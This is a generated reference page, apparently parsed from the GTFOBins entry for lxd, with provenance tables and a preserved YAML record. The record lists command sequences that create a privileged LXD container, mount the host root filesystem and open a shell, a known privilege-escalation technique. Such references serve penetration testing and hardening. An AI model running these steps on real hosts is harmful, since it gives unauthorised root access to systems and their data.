---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lxd

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lxd` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lxd` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [lxd](../../tools/linux/lxd.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | lxd |
| name | lxd |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/lxd/ |

## Preserved Source Material

````yaml
_body: ''
_name: lxd
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lxd
functions:
  shell:
  - code: 'lxc init ubuntu:16.04 x -c security.privileged=true

      lxc config device add x x disk source=/ path=/mnt/ recursive=true

      lxc start x

      lxc exec x /bin/sh'
    comment: The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.
    contexts:
      sudo: null
      suid: null
  - code: 'lxc image import ./alpine*.tar.gz --alias x

      lxc init x x -c security.privileged=true

      lxc config device add x x disk source=/ path=/mnt/ recursive=true

      lxc start x

      lxc exec x /bin/sh'
    comment: 'This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local
      image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):


      ```

      git clone https://github.com/saghul/lxd-alpine-builder

      cd lxd-alpine-builder

      sudo ./build-alpine -a i686

      ```'
    contexts:
      sudo: null
      suid: null
````
